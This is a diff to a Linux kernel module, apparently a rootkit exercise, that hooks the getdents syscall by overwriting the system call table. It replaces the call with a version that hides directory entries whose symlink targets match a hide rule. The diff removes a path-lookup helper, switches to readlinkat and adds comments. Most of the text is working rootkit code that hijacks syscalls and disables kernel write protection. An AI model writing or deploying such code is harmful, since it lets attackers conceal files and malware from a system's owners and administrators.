@@ -30,7 +30,6 @@ MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");
 
 void **sys_call_table;
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage ssize_t (*syscall_readlink) (const char *path, char *buf, size_t bufsiz);
 asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf, size_t bufsiz);
 
 /*
@@ -84,32 +83,33 @@ int check_symlink(char *path)
 	return hide(name);
 }
 
-ssize_t get_path(unsigned int fd, char *path, size_t bufsiz) {
-	struct files_struct *current_files;
-	struct fdtable *files_table;
-	struct path files_path;
-	size_t path_len;
-	char *cwd;
-	char *buf = (char *) kmalloc(GFP_KERNEL, 128*sizeof(char));
-
-	current_files = current->files;
-	files_table = files_fdtable(current_files);
-	
-	files_path = files_table->fd[fd]->f_path;
-	cwd = d_path(&files_path, buf, 100*sizeof(char));
-	//printk(KERN_INFO "Found fd %d with name %s!\n", fd, cwd);
-	path_len = strlen(cwd);
-	
-	/* check whether the supplied buffer is big enough */
-	if(path_len > bufsiz) {
-		return -ENOMEM;
-	}
-	
-	memcpy(path, cwd, path_len);
-	kfree(buf);
-	
-	return strlen(cwd);
-}
+/* Gets the absolute path to a file identified by fd */
+//ssize_t get_path(unsigned int fd, char *path, size_t bufsiz) {
+//	struct files_struct *current_files;
+//	struct fdtable *files_table;
+//	struct path files_path;
+//	size_t path_len;
+//	char *cwd;
+//	char *buf = (char *) kmalloc(GFP_KERNEL, 128*sizeof(char));
+//
+//	current_files = current->files;
+//	files_table = files_fdtable(current_files);
+//	
+//	files_path = files_table->fd[fd]->f_path;
+//	cwd = d_path(&files_path, buf, 100*sizeof(char));
+//	//printk(KERN_INFO "Found fd %d with name %s!\n", fd, cwd);
+//	path_len = strlen(cwd);
+//	
+//	/* check whether the supplied buffer is big enough */
+//	if(path_len > bufsiz) {
+//		return -ENOMEM;
+//	}
+//	
+//	memcpy(path, cwd, path_len);
+//	kfree(buf);
+//	
+//	return strlen(cwd);
+//}
    
 /*
  * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
@@ -121,21 +121,13 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 	/* nothing else above this line */
 	
 	mm_segment_t old_fs;
-	char buf[128];
 	char lpath[128];
-	char path[128];
-	size_t path_len;
-	size_t buf_len;
-	ssize_t lpath_len;
+	size_t lpath_len;
+	
 	long ret;
 	int len = 0;
 	int tlen = 0;
 
-	path_len = get_path(fd, path, 128);
-	memset(path+path_len, '/', 1);
-	path_len++;
-	
-	//printk(KERN_INFO "Len: %zu - Path: %s", path_len, path);
 	ret = (*original_getdents) (fd,dirp,count);	
 	tlen = ret;
 		
@@ -144,25 +136,21 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		memset(lpath, 0, 128);	
-		memset(buf, 0, 128);	
-		memcpy(buf, path, path_len);
-		memcpy(buf+path_len, dirp->d_name, strlen(dirp->d_name));
-		memset(buf+path_len+strlen(dirp->d_name)+1, '\0', 1);
-		//printk(KERN_INFO "Currently parsing file %s\n", buf);
 		
-
+		/* tell the kernel to ignore kernel-space memory in syscalls */
 		old_fs = get_fs();
 		set_fs(KERNEL_DS);
 		
+		/* execute our readlinkat syscall */
 		lpath_len = (*syscall_readlinkat) (fd, dirp->d_name, lpath, 128);
-			
+		
+		/* reset the kernel */	
 		set_fs(old_fs);
 		
+		/* terminate the string properly */	
 		memset(lpath+lpath_len, '\0', 1);	
-		printk(KERN_INFO "Found symlink to: %s - Length of the path: %d\n", lpath, lpath_len);
-		
 
-		/* Check if we need to hide this symlink */
+		/* Check if we need to hide this symlink (only if it is a symlink ofc) */
 		if(lpath_len > 0 && check_symlink(lpath))
 		{
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
@@ -227,7 +215,7 @@ int init_module (void)
 	/* get the pointer to the sys_call_table */
 	sys_call_table = (void *) sysmap_sys_call_table;
 
-	syscall_readlink = (void*) sys_call_table[__NR_readlink];
+	/* get the 'readlinkat' syscall */
 	syscall_readlinkat = (void*) sys_call_table[__NR_readlinkat];
 
 	/* disable the write protection */
